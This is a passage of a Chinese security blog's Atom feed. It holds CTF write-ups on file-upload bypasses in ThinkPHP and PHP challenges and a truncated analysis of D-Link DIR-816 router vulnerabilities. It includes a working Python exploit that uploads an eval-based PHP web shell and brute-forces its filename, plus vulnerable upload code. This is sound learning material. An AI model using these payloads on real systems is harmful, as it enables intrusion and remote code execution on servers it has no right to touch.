<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>prontosil</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://prontosil.club/"/>
  <updated>2019-10-20T11:37:21.355Z</updated>
  <id>https://prontosil.club/</id>
  
  <author>
    <name>百浪多息</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>roarctf一道文件上传题目的分析</title>
    <link href="https://prontosil.club/2019/10/20/roarctf-wp/"/>
    <id>https://prontosil.club/2019/10/20/roarctf-wp/</id>
    <published>2019-10-20T10:29:03.000Z</published>
    <updated>2019-10-20T11:37:21.355Z</updated>
    
    <content type="html"><![CDATA[<h2>simpleupload</h2><p>这题苏师傅做出来了，但是我对着苏师傅简陋的wp没复现出来。桑心</p><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $uploadFile = $_FILES[<span class="string">'file'</span>] ;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (strstr(strtolower($uploadFile[<span class="string">'name'</span>]), <span class="string">".php"</span>) ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        $upload = <span class="keyword">new</span> \Think\Upload();<span class="comment">// 实例化上传类</span></span><br><span class="line">        $upload-&gt;maxSize  = <span class="number">4096</span> ;<span class="comment">// 设置附件上传大小</span></span><br><span class="line">        $upload-&gt;allowExts  = <span class="keyword">array</span>(<span class="string">'jpg'</span>, <span class="string">'gif'</span>, <span class="string">'png'</span>, <span class="string">'jpeg'</span>);<span class="comment">// 设置附件上传类型</span></span><br><span class="line">        $upload-&gt;rootPath = <span class="string">'./Public/Uploads/'</span>;<span class="comment">// 设置附件上传目录</span></span><br><span class="line">        $upload-&gt;savePath = <span class="string">''</span>;<span class="comment">// 设置附件上传子目录</span></span><br><span class="line">        $info = $upload-&gt;upload() ;</span><br><span class="line">        <span class="keyword">if</span>(!$info) &#123;<span class="comment">// 上传错误提示错误信息</span></span><br><span class="line">          <span class="keyword">$this</span>-&gt;error($upload-&gt;getError());</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">// 上传成功 获取上传文件信息</span></span><br><span class="line">          $url = __ROOT__.substr($upload-&gt;rootPath,<span class="number">1</span>).$info[<span class="string">'file'</span>][<span class="string">'savepath'</span>].$info[<span class="string">'file'</span>][<span class="string">'savename'</span>] ;</span><br><span class="line">          <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">"url"</span>=&gt;$url,<span class="string">"success"</span>=&gt;<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我还是需要一张文件上传的思维图</p><p><a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="noopener">一个想帮你总结所有上传类型的靶场</a></p><p><img src="/2019/10/20/roarctf-wp/%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%E8%84%91%E5%9B%BE.png" alt="上传漏洞解析脑图"></p><h2>题目分析</h2><p>是<code>thinkphp</code>框架，获取到上传的文件<code>$_FILES['file']</code>之后，实例化一个类<code>Upload()</code>，问题显然是出现在这个类上的</p><p>然而我最大的问题是，找不到上传的接口！！！</p><p>这就涉及到thinkphp的路由是怎么搞得，<code>thinkphp</code>是单入口的框架，入口点在<code>public/index.php</code>，之后是按照模块控制器方法来进行路由的。</p><p>但是这里的命名空间<code>Home\Controller</code>，并不是以往熟悉的<code>app\index\Controller</code></p><p>所以这里应该是一个单一模块的，也就是说上传接口在<code>http://index.php/Home/index/upload</code>（这里就不是很明白了，明明这个<code>Controller</code>是叫<code>IndexController</code></p><p><img src="/2019/10/20/roarctf-wp/1571568323600.png" alt="1571568323600"></p><p>这题虽然是限制了不能以<code>.php</code>结尾，但是仔细查看才知道只是限制了<code>$_FILES['file']</code>,这个<code>file</code>只是在表单中设置的一个变量。</p><p>查看<code>thinkphp</code>的源码可以看到。这个<code>upload</code>方法直接就能上传所有的文件了</p><p>这样我们的利用思路就有了:</p><blockquote><p>上传一个<code>file</code>的文件能够获得文件名，同时上传一个<code>file1</code>的文件，这个文件也会被上传但是我们不知道它的文件名</p><p>这时候爆破就好了</p></blockquote><p>thinkphp3默认使用uniqid()函数根据时间生成文件名，两个文件上传时间相近可以爆破。</p><p>对这里还需要知道<code>thinkphp</code>的版本</p><p>&lt;img src=&quot;roarctf-wp/1571569146514.png&quot; alt=&quot;1571569146514&quot; style=&quot;zoom:33%;&quot; /&gt;</p><p><img src="/2019/10/20/roarctf-wp/0.png" alt="img"></p><h2>exp</h2><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://cf063512-b68d-41ff-a3c1-405b73e0d84f.node3.buuoj.cn/"</span></span><br><span class="line"></span><br><span class="line">path = url + <span class="string">"/index.php/home/index/upload"</span></span><br><span class="line">files = &#123;<span class="string">"file"</span>:(<span class="string">"a.txt"</span>,<span class="string">'a'</span>), <span class="string">"file1"</span>:(<span class="string">"a.php"</span>, <span class="string">'&lt;?php eval($_GET["a"]);'</span>)&#125;</span><br><span class="line">r = requests.post(path, files=files)</span><br><span class="line">t1 = r.text.split(<span class="string">"/"</span>)[<span class="number">-1</span>].split(<span class="string">"."</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">print</span> t1</span><br><span class="line"><span class="keyword">print</span> r.content</span><br><span class="line">t1 = int(t1, <span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> t1</span><br><span class="line"></span><br><span class="line">j = t1</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    path = url + <span class="string">"/Public/Uploads/2019-10-20/%s.php"</span> % hex(j)[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(path, timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> r.status_code != <span class="number">404</span>:</span><br><span class="line">        <span class="keyword">print</span> path</span><br><span class="line">        <span class="keyword">print</span> r.text</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span> j, hex(j)[<span class="number">2</span>:<span class="number">-1</span>], r.status_code</span><br><span class="line">    j -= <span class="number">1</span></span><br></pre></td></tr></table></figure></p><p><img src="/2019/10/20/roarctf-wp/1571568818720.png" alt="1571568818720"></p><h2>总结</h2><p>这题确实学到了很多东西，对于文件上传还不是很熟悉，那个<code>$_FILES</code>数组，还有前后端是怎么交互的弄清楚了就好做了</p><h2>文件上传类型简要分析</h2><p><a href="https://www.anquanke.com/post/id/164561" target="_blank" rel="noopener">h4lo师傅写的文章</a>感觉总结的很到位</p><p>分析文件上传时候的数据包</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;text&quot;</span><br><span class="line"></span><br><span class="line">title</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;chrome.png&quot;</span><br><span class="line"></span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">PNG ... content of chrome.png ...</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA--</span><br></pre></td></tr></table></figure></p><p><code>boundary</code>是一个字符串，用来切分数据。每个字段之间使用 ———WebKitFormBoundaryxxx 隔开</p><p>这里就和 post 请求一样，可以自己增加参数，就形如下面这样，将参数名放到 name 里，参数值放到下面：</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundary1PkqXeou9aUAIMHr</span><br><span class="line">Content-Disposition: form-data; name=&quot;filename&quot;</span><br><span class="line"></span><br><span class="line">1.php</span><br></pre></td></tr></table></figure></p><p>那么这里就增加了一个参数 filename = ‘1.php’</p><p>前后端的交互就是通过这个<code>name</code>进行的，也就是说后端会用<code>$_FILES[filename]</code>这个数组，注意<code>$_FILES</code>是一个二维数组，去获取这个文件的文件名，大小之类的信息。</p><blockquote><p>这里有两个文件名，一个是上传的<code>name</code>，另一个是<code>$_FIlES[filename]</code></p></blockquote><h3>简单地绕过</h3><p>前端js这个不用说</p><p>也有通过<strong>MIME</strong>来校验的，</p><p><img src="/2019/10/20/roarctf-wp/1571569569299.png" alt="1571569569299"></p><h3>wafupload</h3><p>简要分析一下这道题，前端可以通过表单上传文件，同时你可以自定义文件名(不过有啥用呢？)</p><p>因为后端会同时去判断你有没有自定义文件名</p><p><code>$file = empty($_POST['filename']) ? $_FILES['file']['name'] : $_POST['filename'];</code></p><p>白名单检测只能是<code>'image/jpeg', 'image/png', 'image/gif'</code>,文件后缀也只能是<code>'jpg', 'png', 'gif'</code></p><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#$sandbox = '/var/www/html/upload/' . md5("phpIsBest" . $_SERVER['REMOTE_ADDR']);</span></span><br><span class="line">$sandbox = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#@mkdir($sandbox);</span></span><br><span class="line"><span class="comment">#@chdir($sandbox);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_FILES[<span class="string">'file'</span>])) &#123;</span><br><span class="line">    <span class="comment">#mime check</span></span><br><span class="line">    <span class="keyword">if</span> (!in_array($_FILES[<span class="string">'file'</span>][<span class="string">'type'</span>], [<span class="string">'image/jpeg'</span>, <span class="string">'image/png'</span>, <span class="string">'image/gif'</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'This type is not allowed!'</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"pass 1n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#check filename</span></span><br><span class="line">    $file = <span class="keyword">empty</span>($_POST[<span class="string">'filename'</span>]) ? $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>] : $_POST[<span class="string">'filename'</span>];</span><br><span class="line">    <span class="keyword">if</span> (!is_array($file)) &#123;</span><br><span class="line">        $file = explode(<span class="string">'.'</span>, strtolower($file));</span><br><span class="line">    &#125;</span><br><span class="line">    $ext = end($file);</span><br><span class="line">    <span class="keyword">if</span> (!in_array($ext, [<span class="string">'jpg'</span>, <span class="string">'png'</span>, <span class="string">'gif'</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'This file is not allowed!'</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"pass 2n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $filename = reset($file) . <span class="string">'.'</span> . $file[count($file) - <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $sandbox . <span class="string">'/'</span> . $filename)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Success!'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'filepath:'</span> . $sandbox . <span class="string">'/'</span> . $filename;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Failed!'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__file__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;Upload Your Shell&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">"file"</span>&gt;Filename:&lt;/label&gt;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span> name=<span class="string">"filename"</span>&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=<span class="string">"file"</span> name=<span class="string">"file"</span> id=<span class="string">"file"</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"Submit"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>看似做的天衣无缝了，也确实考虑到了数组的情况：</p><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!in_array($ext, [<span class="string">'jpg'</span>, <span class="string">'png'</span>, <span class="string">'gif'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'This file is not allowed!'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"pass 2n"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>之后通古<code>end</code>函数去取出文件的后缀名</p><p>但是<code>end</code>函数有一个问题</p><blockquote><p>end 函数取到的是给数组的最后一次赋值的那个值，继续尝试会发现 reset 函数也是一样，第一个给数组赋值的值就是 reset 函数返回的值</p></blockquote><p>会根据赋值先后顺序该表值，可以去调试一下</p><p><img src="/2019/10/20/roarctf-wp/1571571364088.png" alt="1571571364088"></p><p>这里的 end 函数取到了第二个给数组赋值的值，也就是 filename[0] ，reset 函数的值为 filename[1]。这边构造</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filename[1] = php</span><br><span class="line">filename[0] = png</span><br></pre></td></tr></table></figure></p><p>在后面拼接 $filename 时候，再一次拼接到后缀名，即</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$filename = reset($file) . &apos;.&apos; . $file[count($file) - 1];</span><br></pre></td></tr></table></figure></p><p>这里的</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file[count($file) - 1]</span><br></pre></td></tr></table></figure></p><p>一定是取到 filename[1]，所以上面给 filename[1] 赋值为 php 的意义就在这里。</p><h3>上海网安赛 web3</h3><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">//$dir=md5("icq" . $_SERVER['REMOTE_ADDR']);</span></span><br><span class="line">    <span class="comment">//$dir=md5("icq");</span></span><br><span class="line">    <span class="comment">//$sandbox = '/sandbox/' . $dir;</span></span><br><span class="line">    <span class="comment">//@mkdir($sandbox);</span></span><br><span class="line">    <span class="comment">//@chdir($sandbox);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>])&#123;</span><br><span class="line">        $filename = !<span class="keyword">empty</span>($_POST[<span class="string">'file'</span>]) ? $_POST[<span class="string">'file'</span>] : $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</span><br><span class="line">        <span class="keyword">if</span> (!is_array($filename)) &#123;</span><br><span class="line">            $filename = explode(<span class="string">'.'</span>, $filename);</span><br><span class="line">        &#125;</span><br><span class="line">        $ext = end($filename);</span><br><span class="line">        var_dump($ext);</span><br><span class="line">        <span class="keyword">if</span>($ext==$filename[count($filename) - <span class="number">1</span>])&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"emmmm..."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        var_dump($filename);</span><br><span class="line">        $new_name = (string)rand(<span class="number">100</span>,<span class="number">999</span>).<span class="string">"."</span>.$ext;</span><br><span class="line">        move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>],$new_name);</span><br><span class="line">        $_ = $_POST[<span class="string">'hehe'</span>];</span><br><span class="line">        <span class="keyword">if</span>(@substr(file($_)[<span class="number">0</span>],<span class="number">0</span>,<span class="number">6</span>)===<span class="string">'@&lt;?php'</span> &amp;&amp; strpos($_,$new_name)===<span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span>($_);</span><br><span class="line">        &#125;</span><br><span class="line">        unlink($new_name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"file"</span> name=<span class="string">"file"</span> id=<span class="string">"file"</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"Submit"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2&gt;simpleupload&lt;/h2&gt;
&lt;p&gt;这题苏师傅做出来了，但是我对着苏师傅简陋的wp没复现出来。桑心&lt;/p&gt;
&lt;p&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>test</title>
    <link href="https://prontosil.club/2019/10/20/test/"/>
    <id>https://prontosil.club/2019/10/20/test/</id>
    <published>2019-10-20T10:15:50.000Z</published>
    <updated>2019-10-20T10:25:49.623Z</updated>
    
    <content type="html"><![CDATA[<h2>这是一篇测试图片的文章</h2><p>在<code>Typora</code>中可以选择将图片复制到同名的文件夹下：</p><p>同时<code>Typora</code>现在还支持缩放图片，是不是很神奇？</p><p>&lt;img src=&quot;test/1571567124704.png&quot; alt=&quot;1571567124704&quot; style=&quot;zoom:33%;&quot; /&gt;</p><p><img src="/2019/10/20/test/1571567097935.png" alt="1571567097935"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2&gt;这是一篇测试图片的文章&lt;/h2&gt;
&lt;p&gt;在&lt;code&gt;Typora&lt;/code&gt;中可以选择将图片复制到同名的文件夹下：&lt;/p&gt;
&lt;p&gt;同时&lt;code&gt;Typora&lt;/code&gt;现在还支持缩放图片，是不是很神奇？&lt;/p&gt;
&lt;p&gt;&amp;lt;img src=&amp;quot;test/
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>DIR-816再分析</title>
    <link href="https://prontosil.club/2019/10/19/dir-816-zai-fen-xi/"/>
    <id>https://prontosil.club/2019/10/19/dir-816-zai-fen-xi/</id>
    <published>2019-10-19T07:12:32.000Z</published>
    <updated>2019-10-19T08:28:23.574Z</updated>
    
    <content type="html"><![CDATA[<p>群晖的路由器好难分析，最后还是只能复现一下D-LINK的相关漏洞。</p><h2>DIR-816历史漏洞</h2><ul><li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-17066" target="_blank" rel="noopener">CVE-2018-17066</a>: <a href="https://github.com/PAGalaxyLab/VulInfo/blob/master/D-Link/DIR-816/cmd_injection_0" target="_blank" rel="noopener">Command injection</a>. Credit: nabla</li><li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-17068" target="_blank" rel="noopener">CVE-2018-17068</a>: <a href="https://github.com/PAGalaxyLab/VulInfo/blob/master/D-Link/DIR-816/cmd_injection_1" target="_blank" rel="noopener">Command injection</a>. Credit: nabla</li><li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-17064" target="_blank" rel="noopener">CVE-2018-17064</a>: <a href="https://github.com/PAGalaxyLab/VulInfo/blob/master/D-Link/DIR-816/cmd_injection_2" target="_blank" rel="noopener">Command injection</a>. Credit: nabla</li><li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-17063" target="_blank" rel="noopener">CVE-2018-17063</a>: <a href="https://github.com/PAGalaxyLab/VulInfo/blob/master/D-Link/DIR-816/cmd_injection_3" target="_blank" rel="noopener">Command injection</a>. Credit: nabla</li><li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-17067" target="_blank" rel="noopener">CVE-2018-17067</a>: <a href="https://github.com/PAGalaxyLab/VulInfo/blob/master/D-Link/DIR-816/stack_overflow_0" target="_blank" rel="noopener">Stack overflow</a>. Credit: nabla</li><li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-17065" target="_blank" rel="noopener">CVE-2018-17065</a>: <a href="https://github.com/PAGalaxyLab/VulInfo/blob/master/D-Link/DIR-816/stack_overflow_1" target="_blank" rel="noopener">Stack overflow</a>. Credit: nabla</li><li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10041" target="_blank" rel="noopener">CVE-2019-10041</a>: <a href="https://github.com/PAGalaxyLab/VulInfo/blob/master/D-Link/DIR-816/edit_sys_account/README.md" target="_blank" rel="noopener">Edit System Account Without Authentication</a>. Credit: lbp</li><li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10039" target="_blank" rel="noopener">CVE-2019-10039</a>: <a href="https://github.com/PAGalaxyLab/VulInfo/blob/master/D-Link/DIR-816/edit_web_and_sys_account/README.md" target="_blank" rel="noopener">Edit Web And System Account Without Authentication</a>. Credit: lbp</li><li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10040" target="_blank" rel="noopener">CVE-2019-10040</a>: <a href="https://github.com/PAGalaxyLab/VulInfo/blob/master/D-Link/DIR-816/remote_cmd_exec_0/README.md" target="_blank" rel="noopener">Remote Command Execute</a>. Credit: lbp</li><li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10042" target="_blank" rel="noopener">CVE-2019-10042</a>: <a href="https://github.com/PAGalaxyLab/VulInfo/blob/master/D-Link/DIR-816/reset_router/README.md" target="_blank" rel="noopener">Reset Router Without Authentication</a>. Credit: lbp</li></ul><h2>DIR-816管理页面分析</h2><p>主程序位于 <code>./bin/goahead</code></p><p>输入账号密码后，将会向goform/formLogin接口发送如下图所示的数据包进行验证。从数据包中可以看到关键的参数有username，password以及tokenid，其中username使用了base64进行编码，password则进行了某种加密</p><p><code>ghidra</code>中查看函数 <code>FUN_00457a74</code>的源码</p><p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">....</span><br><span class="line">....</span><br><span class="line">username = websGetVar(iParm1,<span class="string">"username"</span>,&amp;DAT_00473984);</span><br><span class="line">  password = (<span class="keyword">char</span> *)websGetVar(iParm1,<span class="string">"password"</span>,&amp;DAT_00473984);</span><br><span class="line">  tokenid = (<span class="keyword">char</span> *)websGetVar(iParm1,<span class="string">"tokenid"</span>,&amp;DAT_00473984);</span><br><span class="line">  <span class="built_in">strcpy</span>((<span class="keyword">char</span> *)&amp;local_158,tokenid);</span><br><span class="line">                    